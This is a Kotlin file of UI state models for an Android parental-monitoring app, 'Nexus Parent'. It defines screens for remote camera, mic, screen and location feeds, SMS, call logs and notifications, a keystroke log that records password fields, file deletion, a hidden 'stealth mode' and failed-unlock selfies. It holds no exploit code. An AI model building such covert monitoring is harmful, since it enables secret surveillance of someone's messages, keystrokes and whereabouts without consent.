package com.nexus.parent.state

import androidx.annotation.DrawableRes
import com.nexus.parent.R

/**
 * ParentUiModels.kt - Immutable UI state contracts for Nexus Parent Android.
 *
 * Hey friend! Think of these models as the single source of truth for everything rendered on
 * screen. Right now this powers the interactive UI-only milestone; in the next phase, the
 * WebRTC and Firebase controllers will simply push updates into these exact models without
 * changing a single Composable layout!
 */

enum class ConnectionPhase {
    DISCONNECTED,
    CONNECTING,
    CONNECTED,
    RECONNECTING
}

enum class SidebarSectionId {
    LIVE,
    COMMS,
    APPS,
    CONTROLS
}

enum class FeatureTarget {
    MAIN_VIEW,
    FLOATING_MIC,
    MONITOR_PANEL,
    STAGED_PANEL
}

enum class FeatureId(
    val title: String,
    val sidebarLabel: String,
    val sectionId: SidebarSectionId,
    val target: FeatureTarget,
    @param:DrawableRes val iconRes: Int
) {
    // 1. Live Surveillance (4)
    CAMERA("Camera Feed", "Monitor Camera", SidebarSectionId.LIVE, FeatureTarget.MAIN_VIEW, R.drawable.ic_camera),
    MIC("Microphone", "Monitor Mic", SidebarSectionId.LIVE, FeatureTarget.FLOATING_MIC, R.drawable.ic_mic),
    SCREEN("Screen Feed", "Monitor Screen", SidebarSectionId.LIVE, FeatureTarget.MAIN_VIEW, R.drawable.ic_monitor),
    LOCATION("Location Tracking", "Monitor Location", SidebarSectionId.LIVE, FeatureTarget.MAIN_VIEW, R.drawable.ic_map_pin),

    // 2. Communications (5)
    SMS("SMS Messages", "Monitor SMS", SidebarSectionId.COMMS, FeatureTarget.MONITOR_PANEL, R.drawable.ic_message_square),
    CALLLOG("Call Log", "Monitor Call Log", SidebarSectionId.COMMS, FeatureTarget.MONITOR_PANEL, R.drawable.ic_phone_call),
    NOTIFICATION("Notifications", "Monitor Notifications", SidebarSectionId.COMMS, FeatureTarget.MONITOR_PANEL, R.drawable.ic_bell),
    KEYBOARD("Keyboard Audit", "Monitor Keyboard", SidebarSectionId.COMMS, FeatureTarget.MONITOR_PANEL, R.drawable.ic_keyboard),
    STORAGE("Monitor Storage", "Monitor Storage", SidebarSectionId.COMMS, FeatureTarget.MAIN_VIEW, R.drawable.ic_folder),

    // 3. Social & AI Activity (5 - Staged Coming Soon matching Desktop)
    WHATSAPP("WhatsApp Activity", "Monitor WhatsApp", SidebarSectionId.APPS, FeatureTarget.STAGED_PANEL, R.drawable.ic_message_circle),
    TELEGRAM("Telegram Activity", "Monitor Telegram", SidebarSectionId.APPS, FeatureTarget.STAGED_PANEL, R.drawable.ic_send),
    CHATGPT("ChatGPT Activity", "Monitor ChatGPT", SidebarSectionId.APPS, FeatureTarget.STAGED_PANEL, R.drawable.ic_bot),
    CLAUDE("Claude Activity", "Monitor Claude", SidebarSectionId.APPS, FeatureTarget.STAGED_PANEL, R.drawable.ic_bot),
    GROK("Grok Activity", "Monitor Grok", SidebarSectionId.APPS, FeatureTarget.STAGED_PANEL, R.drawable.ic_bot),

    // 4. Device Security & Controls (4)
    APPLOCK("App Lock Manager", "Monitor App Lock", SidebarSectionId.CONTROLS, FeatureTarget.MONITOR_PANEL, R.drawable.ic_lock),
    VIBRATEFLASH("Vibrate & Flash Device", "Vibrate & Flash Device", SidebarSectionId.CONTROLS, FeatureTarget.MONITOR_PANEL, R.drawable.ic_zap),
    WALLPAPER("Device Wallpaper", "Change Wallpaper", SidebarSectionId.CONTROLS, FeatureTarget.MONITOR_PANEL, R.drawable.ic_image),
    WELLBEING("Digital Wellbeing", "Digital Wellbeing", SidebarSectionId.CONTROLS, FeatureTarget.MONITOR_PANEL, R.drawable.ic_activity)
}

enum class MonitoringState {
    IDLE,
    STARTING,
    LIVE,
    STOPPING
}

enum class CameraLens(val label: String) {
    REAR("Rear"),
    FRONT("Front")
}

enum class ScreenQuality(val label: String) {
    P1080("1080p"),
    P720("720p"),
    P540("540p")
}

enum class DvrDuration(val label: String) {
    M15("15m"),
    M30("30m"),
    M60("60m")
}

enum class ClipFormat(val label: String) {
    MP4("MP4"),
    WEBM("WebM")
}

enum class LoudspeakerVolume(val label: String) {
    MAX("Max"),
    HIGH("High"),
    NORMAL("Preserve")
}

enum class VoicePresetId(val displayName: String, @param:DrawableRes val iconRes: Int) {
    ORIGINAL("Original", R.drawable.ic_voice_human_male),
    ROBOT_MALE("Robot Male", R.drawable.ic_bot),
    ROBOT_FEMALE("Robot Female", R.drawable.ic_voice_robot_female),
    HUMAN_MALE("Human Male", R.drawable.ic_voice_human_male),
    HUMAN_FEMALE("Human Female", R.drawable.ic_voice_human_female),
    MALE_MONSTAR("Male Monstar", R.drawable.ic_voice_monster_male),
    FEMALE_MONSTAR("Female Monstar", R.drawable.ic_voice_monster_female),
    OVERALL_MORPHED("Overall Morphed", R.drawable.ic_voice_overall_morphed),
    ECHO("Echo", R.drawable.ic_voice_echo),
    ALIEN("Alien", R.drawable.ic_voice_alien)
}

enum class SettingsTabId(val label: String, @param:DrawableRes val iconRes: Int) {
    GENERAL("General & System", R.drawable.ic_general),
    AUDIO("Audio & Intercom", R.drawable.ic_audio_lines),
    SURVEILLANCE("Surveillance & DVR", R.drawable.ic_camera),
    DEVICES("Paired Devices", R.drawable.ic_devices),
    ABOUT("About Nexus Parent", R.drawable.ic_nexus_parent)
}

enum class StealthStatus {
    ARMED,
    WAIT,
    ACTIVE
}

data class DeviceTelemetry(
    val androidVersion: String = "14",
    val sdkInt: Int = 34,
    val brand: String = "Unknown",
    val appVersion: String = "0.1.0-alpha",
    val batteryPercent: Int = 0,
    val isCharging: Boolean = false,
    val chargingSource: String = "Battery",
    val batteryTemperatureC: Float = 0f,
    val isPowerSaveMode: Boolean = false,
    val batteryOptimizationIgnored: Boolean = false,
    val ramUsageText: String = "Unknown",
    val totalRamBytes: Long = 0L,
    val availableRamBytes: Long = 0L,
    val storageUsageText: String = "Unknown",
    val freeStorageBytes: Long = 0L,
    val totalStorageBytes: Long = 0L,
    val storageUsedPercent: Float = 0f,
    val networkState: String = "Unknown",
    val simCarrier: String = "No SIM",
    val isScreenOn: Boolean = true,
    val screenResolution: String = "Unknown",
    val ringerMode: String = "Normal",
    val deviceUptimeMs: Long = 0L,
    val deviceUptimeLabel: String = "Unknown",
    val isStealthMode: Boolean = false,
    val isAppLockEnabled: Boolean = false,
    val securityGuardsText: String = "App Lock Off • Visible",
    val grantedPermissionsCount: Int = 0,
    val totalPermissionsCount: Int = 0,
    val survivalPermissionsText: String = "Unknown"
)

data class DeviceRecord(
    val rawId: String,
    val formattedId: String,
    val name: String,
    val model: String,
    val lastSyncedLabel: String,
    val lastConnectedAt: Long = 0L,
    val telemetry: DeviceTelemetry = DeviceTelemetry()
)

data class ActiveCallAlert(
    val title: String,
    val subtitle: String
)

data class CameraFeedUiState(
    val state: MonitoringState = MonitoringState.IDLE,
    val lens: CameraLens = CameraLens.REAR,
    val isSwitchingLens: Boolean = false,
    val rotationDegrees: Int = 0,
    val dvrProgress: Float = 1f,
    val isAtLiveEdge: Boolean = true,
    val elapsedLabel: String = "00:00",
    val hasDvrClips: Boolean = false,
    val isExportingClip: Boolean = false,
    val dvrBufferStartSeconds: Float = 0f,
    val dvrTotalSeconds: Float = 0f,
    val dvrCurrentSeconds: Float = 0f,
    val dvrActiveSegmentPath: String? = null,
    val dvrSegmentOffsetMs: Int = 0,
    val dvrSeekTriggerId: Long = 0L,
    val isFullscreen: Boolean = false
)

data class ScreenFeedUiState(
    val state: MonitoringState = MonitoringState.IDLE,
    val quality: ScreenQuality = ScreenQuality.P1080,
    val rotationDegrees: Int = 0,
    val dvrProgress: Float = 1f,
    val isAtLiveEdge: Boolean = true,
    val elapsedLabel: String = "00:00",
    val isSystemAudioEnabled: Boolean = true,
    val hasDvrClips: Boolean = false,
    val isExportingClip: Boolean = false,
    val dvrBufferStartSeconds: Float = 0f,
    val dvrTotalSeconds: Float = 0f,
    val dvrCurrentSeconds: Float = 0f,
    val dvrActiveSegmentPath: String? = null,
    val dvrSegmentOffsetMs: Int = 0,
    val dvrSeekTriggerId: Long = 0L,
    val isFullscreen: Boolean = false
)

data class MicUiState(
    val isOverlayOpen: Boolean = false,
    val listenState: MonitoringState = MonitoringState.IDLE,
    val speakState: MonitoringState = MonitoringState.IDLE,
    val selectedVoice: VoicePresetId = VoicePresetId.ORIGINAL,
    val isVoiceMenuExpanded: Boolean = false,
    val spectrumBars: List<Float> = List(36) { 0.12f }
)

enum class MapLayerMode(val label: String) {
    SATELLITE("Satellite"),
    DARK_STREETS("Dark Streets")
}

data class LocationUiState(
    val state: MonitoringState = MonitoringState.IDLE,
    val mapLayer: MapLayerMode = MapLayerMode.SATELLITE,
    val latitude: Double? = null,
    val longitude: Double? = null,
    val accuracyMeters: Float = 0f,
    val speedMps: Float = 0f,
    val altitudeMeters: Double = 0.0,
    val bearingDegrees: Float = 0f,
    val lastTimestampMs: Long? = null,
    val centerRequestToken: Long = 0L,
    val zoomDeltaRequestId: Long = 0L,
    val zoomDeltaSteps: Int = 0,
    val errorMessage: String? = null,
    val address: String = "Waiting for position fix...",
    val coordinatesLabel: String = "--",
    val accuracyLabel: String = "--",
    val velocityLabel: String = "--",
    val lastPingLabel: String = "--"
)

enum class StorageCategory(val label: String) {
    ALL("All Items"),
    IMAGE("Images"),
    VIDEO("Videos"),
    AUDIO("Audio"),
    DOCUMENT("Documents"),
    ARCHIVE("Archives"),
    OTHER("Other")
}

data class StorageBreadcrumb(
    val label: String,
    val fullPath: String
)

data class StorageTransferProgress(
    val transferId: String,
    val fileName: String,
    val purpose: String,
    val progressPercent: Int,
    val receivedBytes: Long,
    val totalBytes: Long
)

data class StorageFileItem(
    val path: String,
    val name: String,
    val isDirectory: Boolean,
    val category: StorageCategory,
    val rawBytes: Long = 0L,
    val sizeLabel: String,
    val modifiedMillis: Long = 0L,
    val modifiedLabel: String,
    val extension: String = "",
    val mimeType: String = "application/octet-stream",
    val thumbnailBase64: String? = null
)

data class StorageUiState(
    val currentPath: String = "/storage/emulated/0",
    val breadcrumbs: List<StorageBreadcrumb> = listOf(
        StorageBreadcrumb(label = "0 (Internal)", fullPath = "/storage/emulated/0")
    ),
    val searchQuery: String = "",
    val selectedCategory: StorageCategory = StorageCategory.ALL,
    val items: List<StorageFileItem> = emptyList(),
    val selectedItem: StorageFileItem? = null,
    val deleteConfirmTarget: StorageFileItem? = null,
    val imagePreviewItem: StorageFileItem? = null,
    val imagePreviewLocalPath: String? = null,
    val isImagePreviewCached: Boolean = false,
    val storageUsedPercent: Float = 0.0f,
    val storageUsageText: String = "CONNECT TO INSPECT STORAGE",
    val isLoadingDirectory: Boolean = false,
    val isLoadingMore: Boolean = false,
    val hasMorePages: Boolean = false,
    val totalCount: Int = 0,
    val activeTransfer: StorageTransferProgress? = null,
    val errorMessage: String? = null
)

data class SmsUiItem(
    val id: String,
    val senderName: String,
    val address: String,
    val body: String,
    val isIncoming: Boolean,
    val isUnread: Boolean,
    val simSlot: String,
    val relativeTime: String,
    val fullDateTime: String,
    val timestampMs: Long = 0L
)

enum class CallFilter(val label: String) {
    ALL("All"),
    MISSED("Missed"),
    INCOMING("Incoming"),
    OUTGOING("Outgoing"),
    DECLINED("Declined")
}

data class CallLogUiItem(
    val id: String,
    val displayName: String,
    val number: String,
    val numberType: String,
    val filterType: CallFilter,
    val durationLabel: String,
    val simSlot: String,
    val relativeTime: String,
    val fullDateTime: String,
    val timestampMs: Long = 0L,
    val durationSeconds: Int = 0,
    val directionLabel: String = "",
    val location: String? = null,
    val features: List<String> = emptyList()
)

enum class NotificationFilter(val label: String) {
    ALL("All"),
    MESSAGES("Messages"),
    SOCIAL("Social"),
    SYSTEM("System"),
    MEDIA("Media")
}

data class NotificationUiItem(
    val key: String,
    val appName: String,
    val packageName: String,
    val title: String,
    val body: String,
    val category: NotificationFilter,
    val relativeTime: String,
    val fullDateTime: String,
    val timestampMs: Long = 0L,
    val bigText: String? = null,
    val subText: String? = null,
    val messages: List<String> = emptyList()
)

data class KeyboardUiItem(
    val id: String,
    val appName: String,
    val fieldHint: String?,
    val text: String,
    val inputType: String,
    val isPassword: Boolean,
    val relativeTime: String,
    val packageName: String = "",
    val timestampMs: Long = 0L
)

enum class WellbeingRange(val label: String) {
    TODAY("Today"),
    SEVEN_DAYS("7 Days")
}

enum class WellbeingCategoryFilter(val label: String) {
    ALL("All"),
    SOCIAL("Social"),
    VIDEO("Video"),
    GAME("Games"),
    PRODUCTIVITY("Productivity"),
    OTHER("Other")
}

data class WellbeingAppItem(
    val packageName: String,
    val appName: String,
    val category: WellbeingCategoryFilter,
    val durationLabel: String,
    val launchCount: Int,
    val percent: Int,
    val totalTimeMs: Long = 0L
)

data class WellbeingBucket(
    val label: String,
    val normalizedValue: Float,
    val durationLabel: String = ""
)

data class WellbeingUiState(
    val monitoringState: MonitoringState = MonitoringState.IDLE,
    val range: WellbeingRange = WellbeingRange.TODAY,
    val searchQuery: String = "",
    val categoryFilter: WellbeingCategoryFilter = WellbeingCategoryFilter.ALL,
    val totalScreenTime: String = "0m",
    val unlockCount: Int = 0,
    val totalLaunches: Int = 0,
    val activeAppName: String = "None",
    val syncedLabel: String? = null,
    val errorMessage: String? = null,
    val buckets: List<WellbeingBucket> = emptyList(),
    val apps: List<WellbeingAppItem> = emptyList()
)

data class AppLockAttemptItem(
    val id: String,
    val timestampLabel: String,
    val fullDateTime: String = timestampLabel,
    val pinCorrect: Boolean,
    val isLockedOut: Boolean,
    val failedAttempts: Int,
    val hasSelfiePreview: Boolean,
    val timestampMs: Long = 0L,
    val selfieBase64: String? = null
)

data class AppLockUiState(
    val monitoringState: MonitoringState = MonitoringState.IDLE,
    val isLockEnabled: Boolean = false,
    val isLockedOut: Boolean = false,
    val searchQuery: String = "",
    val attempts: List<AppLockAttemptItem> = emptyList(),
    val showChangePinDialog: Boolean = false,
    val previewingSelfieAttempt: AppLockAttemptItem? = null
)

data class VibrateFlashUiState(
    val lastSuccess: Boolean? = null,
    val statusMessage: String = "Hardware Link Ready: Select a pattern to trigger"
)

enum class WallpaperTarget(val label: String, val wireValue: String) {
    HOME("Home Screen", "home"),
    LOCK("Lock Screen", "lock"),
    BOTH("Both", "both")
}

data class WallpaperUiState(
    val monitoringState: MonitoringState = MonitoringState.IDLE,
    val target: WallpaperTarget = WallpaperTarget.HOME,
    val isFetching: Boolean = false,
    val isPushing: Boolean = false,
    val pushProgressPercent: Int = 0,
    val hasPreviewLoaded: Boolean = false,
    val homeImageBytes: ByteArray? = null,
    val lockImageBytes: ByteArray? = null,
    val isSameWallpaper: Boolean = true
) {
    fun activePreviewBytes(): ByteArray? {
        return when (target) {
            WallpaperTarget.HOME -> homeImageBytes
            WallpaperTarget.LOCK -> lockImageBytes ?: if (isSameWallpaper) homeImageBytes else null
            WallpaperTarget.BOTH -> homeImageBytes ?: lockImageBytes
        }
    }

    override fun equals(other: Any?): Boolean {
        if (this === other) return true
        if (other !is WallpaperUiState) return false
        return monitoringState == other.monitoringState &&
            target == other.target &&
            isFetching == other.isFetching &&
            isPushing == other.isPushing &&
            pushProgressPercent == other.pushProgressPercent &&
            hasPreviewLoaded == other.hasPreviewLoaded &&
            homeImageBytes.contentEquals(other.homeImageBytes) &&
            lockImageBytes.contentEquals(other.lockImageBytes) &&
            isSameWallpaper == other.isSameWallpaper
    }

    override fun hashCode(): Int {
        var result = monitoringState.hashCode()
        result = 31 * result + target.hashCode()
        result = 31 * result + isFetching.hashCode()
        result = 31 * result + isPushing.hashCode()
        result = 31 * result + pushProgressPercent
        result = 31 * result + hasPreviewLoaded.hashCode()
        result = 31 * result + (homeImageBytes?.contentHashCode() ?: 0)
        result = 31 * result + (lockImageBytes?.contentHashCode() ?: 0)
        result = 31 * result + isSameWallpaper.hashCode()
        return result
    }
}

data class MonitorPanelsUiState(
    val smsState: MonitoringState = MonitoringState.IDLE,
    val smsSearchQuery: String = "",
    val smsItems: List<SmsUiItem> = emptyList(),
    val selectedSms: SmsUiItem? = null,

    val callLogState: MonitoringState = MonitoringState.IDLE,
    val callFilter: CallFilter = CallFilter.ALL,
    val expandedCallId: String? = null,
    val callItems: List<CallLogUiItem> = emptyList(),

    val notificationState: MonitoringState = MonitoringState.IDLE,
    val notificationSearchQuery: String = "",
    val notificationFilter: NotificationFilter = NotificationFilter.ALL,
    val notificationItems: List<NotificationUiItem> = emptyList(),
    val selectedNotification: NotificationUiItem? = null,

    val keyboardState: MonitoringState = MonitoringState.IDLE,
    val keyboardSearchQuery: String = "",
    val keyboardItems: List<KeyboardUiItem> = emptyList(),

    val wellbeing: WellbeingUiState = WellbeingUiState(),
    val appLock: AppLockUiState = AppLockUiState(),
    val vibrateFlash: VibrateFlashUiState = VibrateFlashUiState(),
    val wallpaper: WallpaperUiState = WallpaperUiState()
)

data class SettingsValues(
    val defaultVoicePreset: VoicePresetId = VoicePresetId.ORIGINAL,
    val noiseSuppression: Boolean = true,
    val loudspeakerVolume: LoudspeakerVolume = LoudspeakerVolume.MAX,
    val screenQuality: ScreenQuality = ScreenQuality.P1080,
    val preferredCameraLens: CameraLens = CameraLens.REAR,
    val dvrBufferDuration: DvrDuration = DvrDuration.M30,
    val dvrClipFormat: ClipFormat = ClipFormat.MP4,
    val hardwareAcceleration: Boolean = true,
    val downloadsDirectoryLabel: String = "Downloads/NexusParent",
    val downloadsTreeUri: String? = null,
    val askBeforeDownload: Boolean = false,
    val autoConnectLastDevice: Boolean = false,
    val keepScreenAwake: Boolean = true,
    val alertLowBattery: Boolean = true,
    val alertChildDisconnected: Boolean = true,
    val alertChildActiveCall: Boolean = true
)

data class ParentUiState(
    val isDrawerOpen: Boolean = false,
    val drawerSearchQuery: String = "",
    val collapsedSections: Set<SidebarSectionId> = emptySet(),
    val isDevicePopoverOpen: Boolean = false,

    val connectionPhase: ConnectionPhase = ConnectionPhase.DISCONNECTED,
    val pairingInputDigits: String = "",
    val pairingStatusMessage: String? = null,
    val pairingErrorMessage: String? = null,
    val connectingProgressMessage: String? = null,
    val connectingFromHistoryId: String? = null,
    val connectedDevice: DeviceRecord? = null,
    val lastPairedDevice: DeviceRecord? = null,
    val pairedDevicesHistory: List<DeviceRecord> = emptyList(),
    val selectedPairedDeviceId: String? = null,
    val reconnectAttempt: Int = 0,
    val reconnectMaxAttempts: Int = 9,
    val reconnectSecondsRemaining: Int = 0,

    val activeFeature: FeatureId? = null,
    val liveFeatures: Set<FeatureId> = emptySet(),
    val camera: CameraFeedUiState = CameraFeedUiState(),
    val screen: ScreenFeedUiState = ScreenFeedUiState(),
    val mic: MicUiState = MicUiState(),
    val location: LocationUiState = LocationUiState(),
    val storage: StorageUiState = StorageUiState(),
    val monitor: MonitorPanelsUiState = MonitorPanelsUiState(),

    val stealthStatus: StealthStatus = StealthStatus.ARMED,
    val showStealthConfirmDialog: Boolean = false,
    val showStealthNotConnectedDialog: Boolean = false,

    val isSettingsOpen: Boolean = false,
    val activeSettingsTab: SettingsTabId = SettingsTabId.GENERAL,
    val settings: SettingsValues = SettingsValues(),

    val activeCallAlert: ActiveCallAlert? = null,
    val toastMessage: String? = null
)
